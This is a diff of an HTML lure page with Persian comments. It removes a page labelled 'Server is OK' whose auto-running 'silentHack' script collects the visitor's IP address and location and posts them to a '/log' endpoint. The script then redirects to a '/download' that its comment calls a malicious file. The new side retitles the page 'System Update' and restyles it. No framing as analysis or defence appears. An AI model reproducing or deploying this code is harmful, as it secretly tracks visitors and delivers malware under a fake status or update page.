@@ -3,69 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Sync</title>
+    <title>System Update</title>
     <style>
-        body { 
-            background-color: #ffffff; 
-            color: #333; 
-            font-family: Arial, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            text-align: center;
-        }
-        .container { border: 1px solid #ddd; padding: 20px; border-radius: 5px; width: 80%; max-width: 400px; }
-        h1 { font-size: 16px; margin-bottom: 10px; color: #4CAF50; }
-        p { font-size: 14px; color: #666; }
+        body { font-family: Arial, sans-serif; background-color: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { text-align: center; padding: 20px; border: 1px solid #ccc; background: white; width: 300px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        h2 { color: #333; font-size: 18px; }
+        p { color: #666; font-size: 14px; }
+        .status { margin-top: 10px; color: green; font-weight: bold; display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Server is OK</h1>
-        <p>Data synchronized successfully.</p>
-    </div>
-
-    <script>
-        async function silentHack() {
-            let ip = "Unknown";
-            let geo = "Unknown";
-
-            try {
-                // 1. گرفتن IP
-                const res = await fetch('https://api.ipify.org?format=json');
-                const ipData = await res.json();
-                ip = ipData.ip;
-
-                // 2. گرفتن موقعیت مکانی (بدون اجازه! - مرورگرها معمولا اجازه می‌دهند اگر در HTTPS باشد)
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            geo = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
-                        },
-                        (error) => {
-                            geo = "Geo Denied/Failed";
-                        }
-                    );
-                }
-            } catch (e) {
-                geo = "Error";
-            }
-
-            // 3. ارسال اطلاعات به سرور
-            fetch('/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ ip: ip, geo: geo })
-            });
-
-            // 4. دانلود فایل مخرب
-            window.location.href = '/download';
-        }
-
-        // اجرای خودکار
-        window.onload = silentHack;
-    </script>
-</body>
-</html>
